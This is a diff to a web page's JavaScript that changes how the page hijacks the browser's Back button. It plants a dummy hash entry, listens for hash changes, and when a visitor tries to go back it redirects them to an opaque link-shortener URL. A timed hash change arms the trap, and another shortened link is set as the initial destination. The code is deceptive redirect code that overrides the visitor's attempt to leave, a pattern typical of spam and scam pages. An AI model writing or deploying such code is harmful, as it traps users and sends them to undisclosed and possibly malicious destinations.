@@ -236,24 +236,30 @@ const initialLink = "https://ln.run/TQGSS"; // Replace with the link you want to
 // });
 
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Page loaded. Initializing back-button handling with explicit state tracking.");
+    console.log("Page loaded. Initializing hash-based back-button handling.");
 
-    // Step 1: Push explicit states to the history stack
-    history.pushState({ state: "initial" }, "", location.href);
-    console.log("Initial state pushed to history stack:", location.href);
+    // Step 1: Add a dummy hash to the URL
+    if (!location.hash) {
+        location.hash = "#dummy"; // Ensure there is a hash initially
+        console.log("Initial hash added:", location.hash);
+    }
 
-    history.pushState({ state: "dummy" }, "", location.href + "?step=1");
-    console.log("Dummy state pushed to history stack:", location.href + "?step=1");
-
-    // Step 2: Handle back button using explicit state detection
-    window.addEventListener("popstate", (event) => {
-        console.log("Popstate event detected. Current state:", event.state);
-        if (event.state && event.state.state === "initial") {
+    // Step 2: Detect hash changes
+    window.addEventListener("hashchange", () => {
+        console.log("Hash change detected! Current hash:", location.hash);
+        if (location.hash === "#dummy") {
             console.log("Back button pressed! Redirecting...");
-            location.href = "https://ln.run/ZT6w8"; // Replace with your desired URL
+            location.href = "https://ln.run/ZT6w8"; // Replace with your redirection URL
         }
     });
+
+    // Step 3: Simulate a hash entry for testing
+    setTimeout(() => {
+        location.hash = "#test"; // Simulate a hash change for debugging
+        console.log("Testing hash navigation...");
+    }, 1000);
 });
+
 
 
 
